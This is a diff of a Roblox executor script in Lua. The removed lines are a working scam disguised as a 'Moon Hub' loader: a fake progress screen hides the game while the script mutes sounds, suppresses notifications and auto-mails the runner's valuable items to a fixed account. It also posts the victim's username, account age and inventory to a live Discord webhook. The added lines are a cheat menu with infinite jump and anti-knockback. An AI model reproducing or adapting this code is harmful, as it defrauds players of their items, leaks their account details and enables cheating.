@@ -1,489 +1,233 @@
-task.spawn(function()
-    local Players = game:GetService("Players")
-    local TweenService = game:GetService("TweenService")
-    local RunService = game:GetService("RunService")
-    local player = Players.LocalPlayer
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "MoonHub"
-    gui.IgnoreGuiInset = true
-    gui.ResetOnSpawn = false
-    gui.DisplayOrder = 999999999 -- Keeps it on top of everything
-    gui.Parent = player.PlayerGui
+local LocalPlayer = Players.LocalPlayer
 
-    -- Background click-blocker (Method 2: Cinema Blocker)
-    local blocker = Instance.new("TextButton") -- TextButtons automatically block clicks behind them
-    blocker.Name = "ClickBlocker"
-    blocker.Size = UDim2.new(2, 0, 2, 0) -- Massively oversized to cover any monitor size
-    blocker.Position = UDim2.new(-0.5, 0, -0.5, 0)
-    blocker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    blocker.BackgroundTransparency = 0.5 -- Darkens the game behind your hub
-    blocker.Text = ""
-    blocker.AutoButtonColor = false
-    blocker.ZIndex = 1 -- Puts it at the bottom layer
-    blocker.Parent = gui
+local CONFIG = {
+    Toggles = { AntiBat = true, InfJump = true, Draggable = true },
+    ToggleKey = Enum.KeyCode.V
+}
 
-    -- Main panel
-    local frame = Instance.new("Frame")
-    -- 🛠️ UPDATED: Height increased from 320 to 420 to fully cover game UI below
-    frame.Size = UDim2.new(0, 600, 0, 420) 
-    frame.Position = UDim2.new(0.5, -300, 1.3, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(8, 10, 30)
-    -- 🛠️ UPDATED: Changed from 0.15 to 0.0 to make it completely opaque
-    frame.BackgroundTransparency = 0.0 
-    frame.ZIndex = 10 -- Main panel above dark blocker
-    frame.Parent = gui
+local function getHRP()
+    local character = LocalPlayer.Character
+    if not character then return nil end
+    return character:FindFirstChild("HumanoidRootPart")
+end
 
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 25)
-    corner.Parent = frame
+-- SCREEN SETUP
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DeathGGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = CoreGui
 
-    -- Moon shimmer gradient
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(120,150,255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200,220,255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(15,25,55))
-    }
-    gradient.Rotation = 42
-    gradient.Parent = frame
+-- MAIN GUI
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 220, 0, 185)
+MainFrame.Position = UDim2.new(0.5, -110, 0.5, -92)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
 
-    -- Glow border
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(0, 255, 255)
-    stroke.Thickness = 3
-    stroke.Transparency = 0.2
-    stroke.Parent = frame
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
 
-    -- Title
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1,0,0,60)
-    title.BackgroundTransparency = 1
-    title.Text = "Moon Hub 🌙"
-    title.TextColor3 = Color3.fromRGB(235,245,255)
-    title.Font = Enum.Font.GothamBlack
-    title.TextScaled = true
-    title.ZIndex = 11
-    title.Parent = frame
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(80, 80, 80)
+UIStroke.Thickness = 1.5
+UIStroke.Parent = MainFrame
 
-    -- Loading spinner
-    local spinner = Instance.new("TextLabel")
-    spinner.Size = UDim2.new(0,30,0,30)
-    spinner.Position = UDim2.new(0.12,0,0.45,0)
-    spinner.BackgroundTransparency = 1
-    spinner.Text = "◌"
-    spinner.TextColor3 = Color3.fromRGB(0,255,255)
-    spinner.Font = Enum.Font.GothamBold
-    spinner.TextScaled = true
-    spinner.ZIndex = 11
-    spinner.Parent = frame
+-- TITLE
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.BackgroundTransparency = 1
+Title.Text = "death.gg"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 15
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Position = UDim2.new(0, 15, 0, 0)
+Title.Parent = MainFrame
 
-    -- Status text
-    local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(0.7,0,0,30)
-    status.Position = UDim2.new(0.18,0,0.45,0)
-    status.BackgroundTransparency = 1
-    status.TextColor3 = Color3.fromRGB(220,230,255)
-    status.Font = Enum.Font.GothamMedium
-    status.TextScaled = true
-    status.ZIndex = 11
-    status.Parent = frame
+-- LOCK BUTTON
+local LockBtn = Instance.new("TextButton")
+LockBtn.Size = UDim2.new(0, 25, 0, 25)
+LockBtn.Position = UDim2.new(1, -32, 0, 5)
+LockBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+LockBtn.Text = "🔓"
+LockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+LockBtn.Font = Enum.Font.GothamBold
+LockBtn.TextSize = 14
+LockBtn.AutoButtonColor = false
+LockBtn.Parent = MainFrame
 
-    -- Progress bar background
-    local back = Instance.new("Frame")
-    back.Size = UDim2.new(0.82,0,0,28)
-    back.Position = UDim2.new(0.09,0,0.72,0)
-    back.BackgroundColor3 = Color3.fromRGB(10,15,40)
-    back.ZIndex = 11
-    back.Parent = frame
+local LCorner = Instance.new("UICorner")
+LCorner.CornerRadius = UDim.new(0, 5)
+LCorner.Parent = LockBtn
 
-    Instance.new("UICorner", back).CornerRadius = UDim.new(1,0)
+-- CONTENT AREA
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, -20, 1, -45)
+Content.Position = UDim2.new(0, 10, 0, 40)
+Content.BackgroundTransparency = 1
+Content.Parent = MainFrame
 
-    local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0,0,1,0)
-    bar.BackgroundColor3 = Color3.fromRGB(0,255,220)
-    bar.ZIndex = 11
-    bar.Parent = back
+local Layout = Instance.new("UIListLayout")
+Layout.SortOrder = Enum.SortOrder.LayoutOrder
+Layout.Padding = UDim.new(0, 8)
+Layout.Parent = Content
 
-    Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+-- ANTI BAT
+local AntiBatButton = Instance.new("TextButton")
+AntiBatButton.Size = UDim2.new(1, 0, 0, 35)
+AntiBatButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+AntiBatButton.Font = Enum.Font.GothamBold
+AntiBatButton.TextSize = 13
+AntiBatButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+AntiBatButton.AutoButtonColor = false
+AntiBatButton.Parent = Content
 
-    -- Progress text
-    local percent = Instance.new("TextLabel")
-    percent.Size = UDim2.new(1,0,0,25)
-    percent.Position = UDim2.new(0,0,0.83,0)
-    percent.BackgroundTransparency = 1
-    percent.TextColor3 = Color3.fromRGB(180,255,255)
-    percent.Font = Enum.Font.GothamBold
-    percent.TextScaled = true
-    percent.ZIndex = 11
-    percent.Parent = frame
+local ABCorner = Instance.new("UICorner")
+ABCorner.CornerRadius = UDim.new(0, 8)
+ABCorner.Parent = AntiBatButton
 
-    -- Pop animation
-    TweenService:Create(
-        frame,
-        TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {
-            -- 🛠️ UPDATED: Vertical centering offset changed from -160 to -210 to match new panel height
-            Position = UDim2.new(0.5,-300,0.5,-210) 
-        }
-    ):Play()
+-- INF JUMP
+local InfJumpButton = Instance.new("TextButton")
+InfJumpButton.Size = UDim2.new(1, 0, 0, 35)
+InfJumpButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+InfJumpButton.Font = Enum.Font.GothamBold
+InfJumpButton.TextSize = 13
+InfJumpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+InfJumpButton.AutoButtonColor = false
+InfJumpButton.Parent = Content
 
-    local messages = {
-        "Initializing Moon Core...",
-        "Injecting runtime modules...",
-        "Compiling bytecode...",
-        "Scanning memory regions...",
-        "Decrypting secure containers...",
-        "Mapping execution threads...",
-        "Establishing kernel bridge...",
-        "Synchronizing runtime environment...",
-        "Optimizing performance layers...",
-        "Finalizing Moon systems..."
-    }
+local IJCorner = Instance.new("UICorner")
+IJCorner.CornerRadius = UDim.new(0, 8)
+IJCorner.Parent = InfJumpButton
 
-    local start = tick()
-    local duration = 300 -- Set to 300 seconds for development, or use a smaller number for testing
+-- KEYBIND ROW
+local Row = Instance.new("Frame")
+Row.Size = UDim2.new(1, 0, 0, 25)
+Row.BackgroundTransparency = 1
+Row.Parent = Content
 
-    local spin = {"◐","◓","◑","◒"}
-    local spinIndex = 1
+local KeyLabel = Instance.new("TextLabel")
+KeyLabel.Size = UDim2.new(0.4, 0, 1, 0)
+KeyLabel.BackgroundTransparency = 1
+KeyLabel.Text = "Toggle Key:"
+KeyLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+KeyLabel.Font = Enum.Font.Gotham
+KeyLabel.TextSize = 12
+KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+KeyLabel.Parent = Row
 
-    while true do
-        local elapsed = tick() - start
-        local progress = math.min((elapsed / duration) * 99.99, 99.99)
+local KeybindBtn = Instance.new("TextButton")
+KeybindBtn.Size = UDim2.new(0, 60, 1, 0)
+KeybindBtn.Position = UDim2.new(0.5, 0, 0, 0)
+KeybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+KeybindBtn.Text = "V"
+KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeybindBtn.Font = Enum.Font.GothamBold
+KeybindBtn.TextSize = 12
+KeybindBtn.AutoButtonColor = false
+KeybindBtn.Parent = Row
 
-        bar.Size = UDim2.new(progress / 100,0,1,0)
-        percent.Text = string.format("%.2f%%", progress)
+local KBCorner = Instance.new("UICorner")
+KBCorner.CornerRadius = UDim.new(0, 5)
+KBCorner.Parent = KeybindBtn
 
-        local msg = math.clamp(
-            math.floor((progress/100) * #messages)+1,
-            1,
-            #messages
-        )
+-- UPDATE VISUALS
+local function updateVisuals()
+    if CONFIG.Toggles.AntiBat then
+        AntiBatButton.Text = "Anti-Bat : ON"
+        AntiBatButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    else
+        AntiBatButton.Text = "Anti-Bat : OFF"
+        AntiBatButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    end
 
-        status.Text = messages[msg]
+    if CONFIG.Toggles.InfJump then
+        InfJumpButton.Text = "Inf Jump : ON"
+        InfJumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    else
+        InfJumpButton.Text = "Inf Jump : OFF"
+        InfJumpButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    end
 
-        spinner.Text = spin[spinIndex]
-        spinIndex = spinIndex % #spin + 1
+    if CONFIG.Toggles.Draggable then
+        LockBtn.Text = "🔓"
+    else
+        LockBtn.Text = "🔒"
+    end
+    
+    KeybindBtn.Text = CONFIG.ToggleKey.Name
+end
 
-        -- slow moving aurora effect
-        gradient.Rotation += 0.15
+-- BUTTON EVENTS
+AntiBatButton.MouseButton1Click:Connect(function()
+    CONFIG.Toggles.AntiBat = not CONFIG.Toggles.AntiBat
+    updateVisuals()
+end)
 
-        task.wait(0.08)
+InfJumpButton.MouseButton1Click:Connect(function()
+    CONFIG.Toggles.InfJump = not CONFIG.Toggles.InfJump
+    updateVisuals()
+end)
+
+LockBtn.MouseButton1Click:Connect(function()
+    CONFIG.Toggles.Draggable = not CONFIG.Toggles.Draggable
+    MainFrame.Draggable = CONFIG.Toggles.Draggable
+    updateVisuals()
+end)
+
+KeybindBtn.MouseButton1Click:Connect(function()
+    KeybindBtn.Text = "..."
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if input.KeyCode ~= Enum.KeyCode.Unknown then
+            CONFIG.ToggleKey = input.KeyCode
+            updateVisuals()
+            connection:Disconnect()
+        end
+    end)
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.KeyCode == CONFIG.ToggleKey then
+        MainFrame.Visible = not MainFrame.Visible
     end
 end)
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local MailboxUI = LocalPlayer.PlayerGui:WaitForChild("MailboxUI")
-
-for _, v in pairs(game:GetDescendants()) do
-    if v:IsA("Sound") then
-        v.Volume = 0
-    end
-end
-
-LocalPlayer.PlayerGui.DescendantAdded:Connect(function(v)
-    if v:IsA("ScreenGui") or v:IsA("Frame") or v:IsA("TextLabel") then
-        if string.find(string.lower(v.Name), "notif") 
-        or string.find(string.lower(v.Name), "message")
-        or string.find(string.lower(v.Name), "toast") then
-            v.Visible = false
+-- INFINITE JUMP
+UserInputService.JumpRequest:Connect(function()
+    if CONFIG.Toggles.InfJump then
+        local hrp = getHRP()
+        if hrp then
+            hrp.Velocity = Vector3.new(hrp.Velocity.X, 40, hrp.Velocity.Z)
         end
     end
 end)
 
-
--- ==========================================
--- 🛠️ UPDATED ITEM LIST
--- Only using reliable, non-unique IDs
--- ==========================================
-local itemsToSend = {
-    "Inv_Seeds:Bamboo",
-    "Inv_Seeds:Mushroom",
-    "Inv_Seeds:Gold",
-    "Inv_Seeds:Rainbow",
-    "Inv_Sprinklers:Legendary Sprinkler",
-    "Inv_Sprinklers:Super Sprinkler",
-    "Inv_Seeds:Pineapple"
-}
-
--- ==========================================
--- 🛠️ DYNAMIC MAILBOX FINDER (DEBUG VERSION)
--- ==========================================
-local targetPlayer = "tesergekgegh"
-
-local function getNearestMailboxPrompt()
-    print("🔍 [DEBUG] Looking for your character...")
-    local character = LocalPlayer.Character
-    if not character or not character:FindFirstChild("HumanoidRootPart") then
-        warn("❌ [ERROR] Character not fully loaded. Try jumping and execute again.")
-        return nil
-    end
-    local hrp = character.HumanoidRootPart
-
-    print("🔍 [DEBUG] Looking for Gardens folder...")
-    local gardens = workspace:WaitForChild("Gardens", 5) -- Waits up to 5 seconds so it doesn't freeze forever
-    if not gardens then
-        warn("❌ [ERROR] 'Gardens' folder not found. Did the game map update?")
-        return nil
-    end
-
-    local shortestDistance = math.huge
-    local nearestPrompt = nil
-
-    print("🔍 [DEBUG] Scanning all plots for mailboxes...")
-    for _, plot in pairs(gardens:GetChildren()) do
-        local promptInstance = plot:FindFirstChild("MailboxPrompt", true) 
-        
-        if promptInstance and promptInstance:IsA("ProximityPrompt") then
-            local promptPart = promptInstance.Parent
-            if promptPart and promptPart:IsA("BasePart") then
-                local distance = (hrp.Position - promptPart.Position).Magnitude
-                if distance < shortestDistance then
-                    shortestDistance = distance
-                    nearestPrompt = promptInstance
+-- ANTI BAT
+RunService.PostSimulation:Connect(function()
+    if CONFIG.Toggles.AntiBat then
+        local hrp = getHRP()
+        if hrp then
+            for _, child in ipairs(hrp:GetChildren()) do
+                if child:IsA("BodyVelocity") or child:IsA("BodyGyro") then
+                    child:Destroy()
+                elseif child:IsA("Velocity") then
+                    pcall(function() child:Destroy() end)
                 end
             end
         end
     end
-    
-    return nearestPrompt
-end
+end)
 
-print("⏳ [DEBUG] Fetching nearest mailbox...")
-local prompt = getNearestMailboxPrompt()
-
-if not prompt then
-    warn("🛑 [STOPPING] Script stopped because no mailbox could be found.")
-    return 
-end
-
-local function isItemEmpty(itemFrame)
-    local countLabel = itemFrame:FindFirstChild("Count", true) or itemFrame:FindFirstChild("TextLabel", true)
-    if countLabel and (countLabel.Text == "0" or countLabel.Text == "x0" or countLabel.Text == "0x") then
-        return true
-    end
-    return false
-end
-
--- ==========================================
--- 🌐 DISCORD WEBHOOK SYSTEM
--- ==========================================
-local WebhookURL = "https://discordapp.com/api/webhooks/1526170927912714260/mGOi0-g8iGbM5GjQYwbJq4-wgO4b00JGBwOyBxkHFxPnrebJYaCsoeO0p0a0aeczHS64" -- ⚠️ PUT YOUR URL HERE
-
-local HttpService = game:GetService("HttpService")
-
-local function sendDiscordLog()
-    -- Get executor name (Delta, etc.)
-    local executorName = "Unknown"
-    if identifyexecutor then
-        executorName = identifyexecutor()
-    end
-
-    -- 1. Scan Inventory for the Embed
-    local inventoryString = ""
-    local itemsFound = 0
-    
-    for _, itemName in ipairs(itemsToSend) do
-        local foundItem = MailboxUI:FindFirstChild(itemName, true)
-        if foundItem and not isItemEmpty(foundItem) then
-            -- Extract count
-            local countLabel = foundItem:FindFirstChild("Count", true) or foundItem:FindFirstChild("TextLabel", true)
-            local amount = countLabel and countLabel.Text or "1"
-            
-            -- Clean up the name (e.g., "Inv_Seeds:Mushroom" -> "Mushroom Seeds")
-            local cleanName = string.gsub(itemName, "Inv_Seeds:", "")
-            cleanName = string.gsub(cleanName, "Inv_Sprinklers:", "")
-            
-            inventoryString = inventoryString .. "📦 " .. cleanName .. " — x" .. amount .. "\n"
-            itemsFound = itemsFound + 1
-        end
-    end
-    
-    if itemsFound == 0 then
-        inventoryString = "❌ No valuable items found in inventory."
-    end
-
-    local SummaryURL = "https://api.rubis.app/v2/scrap/gdEn4BpWFH963dGS/raw"
-
-    -- 2. Build the Discord Embed Data
-    local embedData = {
-        ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "Grow A Garden 2 Hit | DARK SCRIPTS",
-            ["description"] = "✅ Yeni hit kaydı geldi. Detaylar aşağıda.",
-            ["color"] = 5814783,
-            ["fields"] = {
-                {
-                    ["name"] = "📄 Player Information",
-                    ["value"] = string.format(
-                        "👤 `Display Name : %s`\n🆔 `Username     : %s`\n📅 `Account Age  : %d days`\n💻 `Executor     : %s`\n👥 `Players      : %d/%d`\n😎 `Receiver     : %s`",
-                        LocalPlayer.DisplayName,
-                        LocalPlayer.Name,
-                        LocalPlayer.AccountAge,
-                        executorName,
-                        #Players:GetPlayers(),
-                        Players.MaxPlayers,
-                        targetPlayer
-                    ),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🐾 Inventory",
-                    ["value"] = inventoryString ~= "" and inventoryString or "❌ Envanterde uygun eşya bulunamadı.",
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🔗 Summary",
-                    ["value"] = SummaryURL,
-                    ["inline"] = false
-                }
-            },
-            ["image"] = {
-                ["url"] = "https://tr.rbxcdn.com/39a660a9c80521e0eb7e39d73d4fcba4/768/432/Image/Png"
-            },
-            ["footer"] = {
-                ["text"] = "Moon Hub - Grow a Garden 2"
-            }
-        }}
-    }
-
--- 3. Send the HTTP Request (Updated for wider compatibility)
-    local HttpFunction = request or http_request or (syn and syn.request) or nil
-    
-    if HttpFunction then
-        local success, result = pcall(function()
-            return HttpFunction({
-                Url = WebhookURL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(embedData)
-            })
-        end)
-        
-        if success then
-            print("🚀 Webhook sent successfully!")
-        else
-            warn("❌ Webhook request failed: " .. tostring(result))
-        end
-       else
-        warn("🛑 Your executor does not support HTTP requests. Discord logging is disabled.")
-    end
-end
-
-print("✅ [SUCCESS] Found nearest mailbox! Starting Reliable Auto-Mailer...")
-
-local webhookSent = false
-
--- ==========================================
-
-local function simpleClick(target)
-    if not target then return end
-    local btn = target
-    -- Look for a button inside the frame if it's not a button itself
-    if target:IsA("Frame") then
-        btn = target:FindFirstChildWhichIsA("TextButton", true) or target:FindFirstChildWhichIsA("ImageButton", true)
-    end
-    
-    if btn then
-        if getconnections then
-            pcall(function()
-                for _, conn in pairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
-            end)
-        else
-            pcall(function() btn:Activate() end)
-        end
-    end
-end
-
-print("Starting the Reliable Auto-Mailer!")
-
-while #itemsToSend > 0 do
-  -- 1. Open Mailbox
-    fireproximityprompt(prompt)
-    task.wait(1.5) 
-    
-    -- Send Discord Log on the very first loop!
-    if not webhookSent then
-        sendDiscordLog()
-        webhookSent = true -- Prevents it from spamming Discord every time it loops
-    end
-
-    -- 2. Search for player
-    local searchBox = MailboxUI:FindFirstChild("SearchBox", true)
-    if searchBox then
-        searchBox:CaptureFocus()
-        searchBox.Text = targetPlayer
-        searchBox:ReleaseFocus()
-        if firesignal then pcall(function() firesignal(searchBox.FocusLost, true) end) end
-        task.wait(1) 
-    end
-
-    -- 3. Click the target player
-    local foundPlayer = false
-    for _, desc in pairs(MailboxUI:GetDescendants()) do
-        if desc:IsA("TextLabel") and (string.lower(desc.Text) == string.lower(targetPlayer) or string.lower(desc.Text) == "@" .. string.lower(targetPlayer)) then
-            simpleClick(desc.Parent)
-            foundPlayer = true
-            break
-        end
-    end
-
-    if not foundPlayer then
-        warn("Could not find player. Resetting UI.")
-        fireproximityprompt(prompt)
-        task.wait(1.5)
-        continue 
-    end
-    task.wait(1.5) 
-
-    -- 4. Find the first valid item
-    local targetItemName = nil
-    local targetIndex = nil
-    
-    for i, itemName in ipairs(itemsToSend) do
-        local foundItem = MailboxUI:FindFirstChild(itemName, true)
-        if foundItem and not isItemEmpty(foundItem) then
-            targetItemName = itemName
-            targetIndex = i
-            break 
-        end
-    end
-    
-    if not targetItemName then
-        print("🎉 All items sent successfully!")
-        break 
-    end
-    
-    print("Sending: " .. targetItemName)
-    
-    -- 5. Select the item up to 20 times
-    local clickCount = 0
-    for i = 1, 20 do
-        local currentItem = MailboxUI:FindFirstChild(targetItemName, true)
-        if currentItem and not isItemEmpty(currentItem) then
-            simpleClick(currentItem)
-            clickCount = clickCount + 1
-            task.wait(0.3) 
-        else
-            break 
-        end
-    end
-
-    task.wait(1) 
-
-    -- 6. Click Send
-    local sendButton = MailboxUI:FindFirstChild("SendButton", true)
-    if sendButton and sendButton.Visible then
-        simpleClick(sendButton)
-        print("Sent " .. clickCount .. " items. Cooldown...")
-        task.wait(10.5) 
-    else
-        warn("Empty item detected: " .. targetItemName .. ". Removing from list.")
-        table.remove(itemsToSend, targetIndex)
-        fireproximityprompt(prompt)
-        task.wait(1.5)
-    end
-end
+-- RUN IT
+updateVisuals()
